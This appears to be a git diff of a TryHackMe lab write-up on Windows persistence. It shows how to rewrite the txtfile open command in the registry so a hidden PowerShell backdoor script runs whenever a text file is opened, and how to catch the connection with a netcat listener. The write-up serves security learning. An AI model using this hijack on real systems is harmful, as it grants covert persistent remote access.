@@ -70,7 +70,7 @@ THM{NO_SHORTCUTS_IN_LIFE}
 
 # Hijacking File Associations
 1. Started this room's machine
-2. `regedit`
+2. `regedit` from the compromised Windows machine to open up the Registry Editor (**Regedit**), which we'll then go and later modify the data in the **Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command** registry, since this is what'll get executed whenever we open a **.txt** file on the compromised WIndows machine
 ```PowerShell
 C:\Users\Administrator>regedit
 ```
@@ -85,7 +85,7 @@ C:\Users\Administrator>regedit
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202%20Zoomed%20In.png)
 
-3. `PowerShell` from the compromised Windows machine
+3. `PowerShell` from the compromised Windows machine to open up PowerShell, which we'll then use to create a PowerShell (.ps1) script containing a payload that we'll use to connect back to our netcat listener that we'll later set up on our Linux machine, in the compromised machine's **C:\Windows\System32** directory
 ```PowerShell
 C:\Users\Administrator>PowerShell
 Windows PowerShell
@@ -108,7 +108,7 @@ PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1
 >> Set-Content -Path $scriptPath -Value $scriptContent
 PS C:\Users\Administrator>
 ```
-10. Change value data to `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`
+10. We'll go back into the Registry Editor that opened up already and we'll change the **textfile**'s current value data to be `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`, which will allow our backdoor script to be executed everytime a user open a text file on the compromised machine 
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Default%20Value%20Data.png)
 
@@ -116,13 +116,13 @@ PS C:\Users\Administrator>
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data%20pt2.png)
 
-11. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to
+11. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to set up our netcat listener that'll listen for any inbound connections
 ```Bash
 root@ip-10-10-173-81:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 
-12. Open any text file
+12. Once our netcat listener, from the compromised Windows machine, we'll open any text file to execute our created payload, which ended up doing so and connecting back to our netcat listener on our attack machine 
 
 ![]()
 
